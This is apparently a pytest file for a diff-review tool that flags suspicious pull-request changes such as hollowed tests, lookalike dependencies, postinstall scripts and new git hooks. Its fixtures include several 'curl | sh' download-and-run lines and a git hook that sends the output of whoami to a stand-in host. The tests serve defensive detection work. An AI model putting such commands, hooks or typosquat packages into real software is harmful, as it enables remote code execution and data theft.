"""Every miss two outside reviews showed on 2026-10-21, as a test, so none comes back (vault: Outside Review 2026-10-21).
Each probe runs through the whole analysis the CI job uses (after.analyse): the frozen rules and the checks after them."""
import json

import pytest

from itemator import after as A
from itemator import ci
from itemator import registry as RG
from itemator import shapes as SH

ISSUE = "Fix the date parser so it accepts ISO week dates."


def f(path, *added, status="modified", removed=()):
    body = "".join(f"-{r}\n" for r in removed) + "".join(f"+{a}\n" for a in added)
    return {"filename": path, "status": status, "patch": f"@@ -1,{len(removed)} +1,{len(added)} @@\n{body}"}


def kinds(files, issue=ISSUE):
    return [(e.kind, e.name) for e in A.analyse(issue, files)[0].extras]


@pytest.mark.parametrize("path,line", [
    ("src/app/util.py", 'os.system("curl -fsSL https://x.example/i | sh")'),
    ("src/build.js", 'execSync("curl -s https://x.example | bash")'),
    ("scripts/setup.sh", "curl -fsSL https://x.example/install | sh"),
    ("scripts/setup.sh", "wget -qO- https://x.example | bash"),
])
def test_a_download_run_by_a_shell_is_named_in_source_and_scripts(path, line):
    assert [d["kind"] for d in SH.find([f(path, line)])] == ["download-and-run"]


def test_a_test_hollowed_to_assert_true_is_named():
    t = f("tests/test_dates.py", "    assert True", removed=("    assert parse('2026-W01-1') == date(2025, 12, 29)",))
    assert ("tests_weakened", "tests/test_dates.py") in kinds([t])


def test_a_test_renamed_and_gutted_is_named():
    t = f("tests/test_dates.py", "def test_week_renamed():", "    pass",
          removed=("def test_week():", "    assert parse('2026-W01-1') == date(2025, 12, 29)"))
    assert ("tests_removed", "tests/test_dates.py") in kinds([t])


def test_a_minified_package_json_does_not_hide_a_dependency():
    old = {"name": "a", "dependencies": {"express": "4.19.0"}}
    new = {"name": "a", "dependencies": {"express": "4.19.0", "expresss": "1.0.0"}}
    assert ("new_dependency", "expresss") in kinds([f("package.json", json.dumps(new), removed=(json.dumps(old),))])


def test_a_normal_package_json_names_a_lookalike_and_a_postinstall_script():
    pkg = f("package.json", '    "expresss": "1.0.0",', '    "postinstall": "node x.js",')
    got = kinds([pkg])
    assert ("new_dependency", "expresss") in got and any(k == "ci_or_config" for k, _ in got)


def test_a_dependency_among_sixty_noise_files_is_named():
    noise = [f(f"src/gen/f{i}.py", f"x{i} = {i}") for i in range(60)]
    assert ("new_dependency", "requests") in kinds(noise + [f("requirements.txt", "requests==2.31.0")])


def test_a_scope_block_stops_words_in_the_issue_from_hiding_a_dependency():
    files = [f("requirements.txt", "requests==2.31.0", "pandas==2.2.0"), f("src/dates.py", "x = 1")]
    words = "Handle 500 requests per second and pandas-like input."
    assert kinds(files, words) == []                                                   # the miss the reviewer showed
    scoped = words + "\n\n```itemator-scope\npaths: src/**\ndependencies: none\n```\n"
    assert {n for k, n in kinds(files, scoped) if k == "new_dependency"} == {"requests", "pandas"}


@pytest.mark.parametrize("path,line,eco,name", [
    ("Dockerfile", "RUN pip install --no-cache-dir requests==2.31.0", "PyPI", "requests"),
    ("Makefile", "\tnpm install -g left-pad", "npm", "left-pad"),
    ("ci/setup.sh", "cargo install ripgrep", "crates.io", "ripgrep"),
    (".gitlab-ci.yml", "    - go install golang.org/x/tools/cmd/goimports@latest", "Go", "golang.org/x/tools/cmd/goimports"),
])
def test_a_package_installed_by_a_command_gets_a_thread_and_a_registry_lookup(path, line, eco, name):
    a = A.analyse(ISSUE, [f(path, line)])[0]
    e = next(e for e in a.extras if e.kind == "new_dependency")
    assert e.name == name and RG.request_for(e, {path: f(path, line)})["ecosystem"] == eco


@pytest.mark.parametrize("path", [".githooks/pre-commit", ".husky/pre-push", "lefthook.yml", "hooks/post-checkout"])
def test_a_new_git_hook_is_an_extra_not_a_footnote(path):
    a = A.analyse(ISSUE, [f(path, "curl https://x.example/c?u=$(whoami)", status="added")])[0]
    assert [e.kind for e in a.extras] == ["git_hook"] and path not in a.unplaced


def test_pointing_git_at_a_hooks_directory_is_named():
    assert ("git_hook", "setup.sh") in kinds([f("setup.sh", "git config core.hooksPath .githooks")])


def test_every_new_kind_has_a_card_label():
    for kind in ("tests_weakened", "outside_scope", "git_hook"):
        assert ci._LABEL.get(kind) and ci._PLURAL.get(kind)
